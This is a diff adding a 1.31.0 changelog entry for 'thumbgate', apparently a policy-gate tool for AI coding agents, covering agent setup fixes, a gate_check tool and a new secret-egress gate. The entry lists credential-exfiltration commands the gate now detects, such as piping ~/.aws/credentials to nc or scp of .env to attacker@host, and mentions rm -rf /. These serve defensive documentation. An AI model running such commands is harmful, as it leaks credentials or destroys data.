@@ -1,5 +1,49 @@
 # Changelog
 
+## 1.31.0
+
+### Minor Changes
+
+- 4066c5b: Make the advertised agent surface real, implement `gate_check`, and block credential exfiltration.
+
+  **`--agent` silently did nothing for two advertised agents.** README and `init --help` both offered `--agent opencode` and `--agent amp`; neither had a reachable handler. They fell through to hook wiring, which rejected them, printed the rejection as an ordinary log line, and exited 0 — while the auto-detect path wrote Claude/Codex/Gemini config so the run looked successful. `--agent opencode` and `--agent claude-code` produced byte-identical file sets. There is now a `SUPPORTED_AGENTS` registry, a real `setupOpenCode()`, and an unknown `--agent` exits 1 listing what is supported.
+
+  **`gate_check` did not exist.** `adapters/cline/.clinerules` has instructed agents to call `thumbgate.gate_check` since the adapter shipped, but `tools/list` returned 42 tools and none was it, so Cline enforcement was inert. Implemented over the same gates engine the PreToolUse hook uses and exposed in every MCP profile. It returns a distinct `warn` state (never `allow`) when a gate matched but warn-by-default posture downgraded it, so an agent is never told a flagged action is fine.
+
+  **Credential exfiltration is now blocked, not just credential reads.** The existing secret guard scans for secret material in the tool input — it catches `cat .env`, but missed every vector where the credential never appears literally in the command (`curl -d "$(cat .env)"`, `--data-binary @.env`, `curl -T ~/.ssh/id_rsa`, `cat ~/.aws/credentials | nc`, `echo $API_KEY | curl`, `base64 .env | curl`, `scp .env attacker@host`). The new `secret-egress` gate requires a credential source and an egress sink in the same command, and is ordered ahead of two broad warn gates that would otherwise swallow it under first-match-wins.
+
+  Also repins stale adapter versions (`claw`, `hermes`, `perplexity` were on 1.26.8 against a 1.30.0 package) with a drift test, and rewrites the README install table to state enforcement tier per agent — hard hook, advisory MCP, or feedback-only — including that advisory means the agent can ignore it.
+
+  Also normalizes harness tool vocabularies before gate evaluation. Cline's `.clinerules` gates `execute_command` / `write_to_file` / `replace_in_file`, while policy gates match `Bash` / `Write` / `Edit`; forwarding the harness name through unchanged meant `execute_command` + `rm -rf /` returned allow. `--agent claude` (a documented alias) is accepted again, and an unparseable OpenCode config is now preserved rather than overwritten.
+
+### Patch Changes
+
+- 8b3a515: Make auto-promoted gates actually enforce: group and match only by executable actions (not tag co-counts), derive command patterns, skip unmatchable/prose-only feedback, exclude originating incidents from regression quarantine, and prove capture→promote→deny end-to-end including the entity-tag failure class. Demo proves ALLOW → 3× 👎 → auto-promote → DENY.
+- cf386d4: Antithesis-inspired autonomous reliability explorer: high-ROI invariants (force-push, rm -rf, secrets, audit), fault injection, deterministic seed/replay, prove:reliability CI lane, self-heal check, and findings→feedback/memory promotion. Also fixes circular tool-input crashes in audit-trail during gate evaluation.
+- 8228ca4: Keep ordinary init and quick-start runs deterministic by configuring only the explicitly selected integration, avoiding package-registry probes in source checkouts, replacing shell-based executable discovery, and requiring explicit opt-in before invoking optional external agent plugin managers with argument-safe, bounded execution.
+- 501c7b7: Back the public /evaluations page with verifiable artifacts: the machine-readable
+  risk-model report (evals/risk-model-report.json, with provenance) is checked in and
+  linked from the page, the route gets a regression test that boots the real server, and
+  docs/ML-EVALUATION.md gains three mermaid diagrams (eval pipeline, enforcement loop,
+  lift chart).
+- 2ff7eec: Add a source-backed FAR.AI comparison page that distinguishes frontier safety research from ThumbGate runtime enforcement, visualizes how research findings can become pre-action rules, and connects buyer-intent traffic to tracked install and workflow-hardening paths.
+- c80bcfd: Fix dashboard Active Gates stuck on "—" by returning gate counts from /v1/feedback/stats and painting them in renderStats on connect/live refresh.
+- 035a1d3: Fix Glama/MCP registry install: ship server.json + glama.json + smithery.yaml with explicit `npx -y thumbgate serve` stdio start so indexers stop guessing `npm start` (HTTP API). Document the contract in README.
+- 4c9794c: Visual homepage overhaul: giant thumbs branding, before/after + self-improving loop diagrams, and a plain-English answer to “is it really self-improving?” (control layer, not model retrain).
+- 9cd85f8: README: add the MCP Toplist rank badge (community contribution by @chrstphe).
+- cf386d4: Pragmatic multi-stage hybrid retrieval (turbopuffer-inspired): attribute-aware first stage, optional dense multi-query + RRF, BM25 rerank, diversify, and continuous recall sampling — all local, no turbopuffer dependency.
+- 19fc800: Add prove:glama-mcp start-contract pin and self-heal check so Glama registry install regressions (missing serve args, npm start guess, expanded MCP profile default) fail closed before merge.
+- fbc2ad4: Pro checkout interstitial adds a nofollow direct Stripe Payment Link CTA so buyers who bounce on the email form can still open live checkout without a second server round-trip.
+- cf386d4: Production RAG stage contracts, document pipeline, structured chat output, and real IR ranking eval (Recall@k, MRR, nDCG) on the gate scoring stack with graded golden qrels.
+- bb6849d: Keep dashboard search responsive by bounding hidden chart work and preventing the paid-help overlay from covering dashboard controls. Make DPO export download the actual preference-pair records through the authenticated POST API.
+- 290a228: Make lesson and document retrieval honestly hybrid end to end: local semantic embeddings, metadata filters, bounded query expansion, weighted fusion, reranking, parent-child document hydration, embedding maintenance, and measured retrieval ablations.
+- 286c20e: Make risk-aware model routing executable with provider dispatch, prompt-free outcome telemetry, and fixed-model holdout evaluation while explicitly separating generation routing from LLM-as-a-Judge scoring and deprecating misleading MoE-style expert terminology.
+- 8ea2fbb: Upgrade Scale The Vibe live demo: sandboxed feedback dir, thumbs branding, ALLOW→👎→DENY learning beat via force-promote, honest auto-promote boundary, deterministic and allow-path proofs.
+
+  Also raises the public npm package file-count ratchet 401 → 405 after landing diagram assets.
+
+- 5638ee7: Harden secret-exfiltration PreToolUse detection for structural vectors (command substitution, curl @file path findings, pipe-to-network, scp/rsync, secret env vars) so the deny-by-default claim matches real coverage beyond literal secret scanners.
+
 ## 1.30.0
 
 ### Minor Changes
